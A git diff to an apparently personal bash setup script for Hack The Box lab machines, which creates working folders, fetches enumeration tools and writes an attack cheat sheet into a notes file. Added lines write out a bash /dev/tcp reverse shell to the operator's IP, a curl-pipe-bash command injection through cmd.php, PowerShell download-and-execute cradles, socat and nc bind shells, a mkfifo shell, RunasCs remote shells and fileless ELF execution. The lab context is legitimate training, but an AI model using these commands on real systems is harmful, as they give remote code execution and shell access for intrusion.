@@ -3,24 +3,24 @@
 # set box name, IP and ostype
 #for folder in $(ls /opt/); do cd /opt/$folder/; sudo git pull; done
 
-BOXNAME=Extension
-LAST=171
-OS=linux
+BOXNAME=Zipping
+LAST= 229
+OS=Lin
 
-export IP=10.10.11.$LAST                           #enter box IP
+export IP=10.10.11.$LAST
 export SELF=`hostname -I | awk '{print $2}'`
-export HOME=/home/kali/hackthebox/$BOXNAME          #enter box Name
-export SELF=$(hostname -I | awk '{print$2}')
+export HOME=/home/travis/hackthebox/$BOXNAME          #enter box Name
+export SELF=$(hostname -I | awk '{print$3}')
 
 #start obsidian in background and push errors/output to /dev/null will need to copy .config/obsidian to folder or something to make it load the working directory but will figure out later...
 #and uhh.. doesn't load the newest version.. for some reason will add to notes to get it going may be just copying the vaults to show the vaults the .config/obsidian/obsidian.json but will play with later.. 
 # the current working vault = 
 #/opt/obsidian/Obsidian-0.11.5.AppImage &>/dev/null &
 
-read "?Press [Enter] key if this is first run"
-read "?Are you sure this is the first run?"
+read "Press [Enter] key if this is first run"
+read "Are you sure this is the first run?"
 ## Bash add pause prompt for 5 seconds ##
-read -t 5 "?I am going to wait for 5 seconds only ..."
+read -t 5 "I am going to wait for 5 seconds only ..."
 
 #only run if first time or will lose all work
 mkdir $HOME
@@ -52,8 +52,10 @@ else
     curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o $HOME/www/linpeas.sh
     curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas_linux_amd64 -o $HOME/www/linpeas_linux_amd64
     #cp /opt/PEASS-ng/linPEAS/linpeas.sh $HOME/www/
-    curl -s -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s -o $HOME/www/pspy64s
+    curl -s -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s -o $HOME/www/pspy64s
+    curl -s -L https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -o $HOME/www/pspy64
 fi
+echo -ne '#!/bin/bash\nbash -i >& /dev/tcp/'$SELF'/9001 0>&1' >> $HOME/www/shell.sh
 chmod +x $HOME/www/*
 
 
@@ -67,6 +69,8 @@ echo '#gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/
 echo '#gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -o buster/root_files.log' >> $HOME/notes
 echo '#gobuster vhosts -u http://$BOXNAME.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o buster/vhosts.log' >> $HOME/notes
 echo '#gobuster dns domain.com -o buster/dom.log' >> $HOME/notes
+echo 'don\t do this: curl http://$IP/cmd.php?cmd=curl http://$SELF/shell.sh|bash ... (unless in browser window) do: ' >> $HOME/notes
+echo 'curl http://$IP/cmd.php --data-urlencode \'cmd=curl http://$SELF/shell.sh|bash\'' >> $HOME/notes
 # Try nikto
 echo "" >> $HOME/notes
 echo "# nikto" >> $HOME/notes
@@ -77,13 +81,31 @@ echo "nikto -h domain.htb" >> $HOME/notes
 echo "" >> $HOME/notes
 echo "# when in virtual Machine" >> $HOME/notes
 echo "any problems kill VBoxClient clipboard etc." >> $HOME/notes
+
 # Windows shells
 echo "" >> $HOME/notes
 echo '# Windows Shells' >> $HOME/notes
 echo 'echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:8080/shell.ps1')" | iconv --to-code UTF16LE | base64 -w0' >> $HOME/notes
-echo 'powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.155/winPEAS.bat', 'C:\temp\winPEAS.bat')"' >> $HOME/notes
+echo "powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.155/winPEAS.bat', 'C:\temp\winPEAS.bat')\"" >> $HOME/notes
 echo 'IWR http://10.10.10.10/shell.exe -OutFile shell.exe' >> $HOME/notes
 echo 'cp /usr/share/webshells/php/simple-backdoor.php .' >> $HOME/notes
+echo 'klist,kinit,ksu when you have a tgt or tgs and just kerberos port 88' >> $HOME/notes
+
+# CREATE A CREDENTIAL OBJECT
+echo "" >> $HOME/notes
+echo '# CREATE A CREDENTIAL OBJECT' >> $HOME/notes
+echo "\$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force" >> $HOME/notes
+echo "\$cred = New-Object System.Management.Automation.PSCredential(\"<USERNAME>\", \$pass)" >> $HOME/notes
+# For local
+echo "" >> $HOME/notes
+echo '# For Local' >> $HOME/notes
+echo "Start-Process -Credential (\$cred)  -NoNewWindow powershell \"iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')\"" >> $HOME/notes
+echo 'see basic powershell in hacktricks for more' >> $HOME/notes
+# runascs
+echo "" >> $HOME/notes
+echo '# runascs' >> $HOME/notes
+echo 'runascs.ps1 is great for executing as another user if all else fails..' >> $HOME/notes
+echo 'Invoke-RunasCs -Username user1 -Password password1 -Command powershell.exe (or cmd.exe) -Remote 10.10.14.129:9001' >> $HOME/notes
 
 # Cool way to pivot/scan
 echo "" >> $HOME/notes
@@ -105,6 +127,27 @@ echo "# On Windows" >> $HOME/notes
 echo "./chisel client 10.10.14.128:9002 R:8080:localhost:8080 R:9510:localhost:9510 R:9512:localhost:9512" >> $HOME/notes
 echo "# if using metasploit" >> $HOME/notes
 echo "portfwd add -l 9510 -p 9510 -r 10.10.11.115" >> $HOME/notes
+
+# Relay Binaries
+echo "" >> $HOME/notes
+echo "# Relay Binaries" >> $HOME/notes
+echo "socat TCP4-LISTEN:4444,fork EXEC:/bin/bash" >> $HOME/notes
+echo "socat tcp-listen:7777,reuseaddr,fork exec:cat,nofork" >> $HOME/notes
+echo "socat tcp-l:9999,reuseaddr,fork EXEC:./leak" >> $HOME/notes
+echo "socat -U TCP-LISTEN:5403,fork EXEC:'/usr/bin/data',stderr,pty,echo=0" >> $HOME/notes
+echo "ncat -l 1234 -c '/usr/bin/data' --keep-open" >> $HOME/notes
+echo "nc -lvnp 9999 -e '/usr/local/bin'" >> $HOME/notes
+echo "## create named pipe" >> $HOME/notes
+echo "rm -f /tmp/f; mkfifo /tmp/f" >> $HOME/notes
+echo "## launch interactive 'sh' session redirected to/from listening nc" >> $HOME/notes
+echo "cat /tmp/f | /bin/sh -i 2>&1 | nc -l 1234 > /tmp/f" >> $HOME/notes
+echo "from another terminal connect" >> $HOME/notes
+
+# Static Binaries
+echo "" >> $HOME/notes
+echo "# Static Binaries" >> $HOME/notes
+echo "https://github.com/andrew-d/static-binaries" >> $HOME/notes
+echo "https://github.com/polaco1782/linux-static-binaries" >> $HOME/notes
 
 # Windows Sharp Binaries
 echo "" >> $HOME/notes
@@ -129,6 +172,13 @@ echo "for conpty shell replace the name invoke-conptyshell and conptyshell and r
 echo "" >> $HOME/notes
 echo "# Fileless elf execution" >> $HOME/notes
 echo "curl http://10.10.14.178/ls.b64 |bash <(curl http://10.10.14.178/ddexec.sh) /bin/test -al" >> $HOME/notes
+# Docker commands
+echo "" >> $HOME/notes
+echo "# Docker commands" >> $HOME/notes
+echo "# enter docker image" >> $HOME/notes
+echo "sudo docker run -it --rm --entrypoint bash hacktehbox/node-web-app" >> $HOME/notes
+echo "# enter docker container" >> $HOME/notes
+echo "sudo docker exec -it container bash" >> $HOME/notes
 
 # Build obsidian files for not keeping
 # Cover page
@@ -137,9 +187,9 @@ echo '  <img  width=1024 src="" />' >> $HOME/$BOXNAME/000\ -\ Cover.md
 echo '</p>' >> $HOME/$BOXNAME/000\ -\ Cover.md
 echo ' ' >> $HOME/$BOXNAME/000\ -\ Cover.md
 echo '# Path of Exploitation' >> $HOME/$BOXNAME/000\ -\ Cover.md
-echo 'Foothold:' >> $HOME/$BOXNAME/000\ -\ Cover.md
-echo 'User:'  >> $HOME/$BOXNAME/000\ -\ Cover.md
-echo 'root:' >> $HOME/$BOXNAME/000\ -\ Cover.md
+echo '* Foothold:' >> $HOME/$BOXNAME/000\ -\ Cover.md
+echo '* User:'  >> $HOME/$BOXNAME/000\ -\ Cover.md
+echo '* root:' >> $HOME/$BOXNAME/000\ -\ Cover.md
 echo ' ' >> $HOME/$BOXNAME/000\ -\ Cover.md
 # loot page
 echo '# Creds' >> $HOME/$BOXNAME/00\ -\ Loot.md
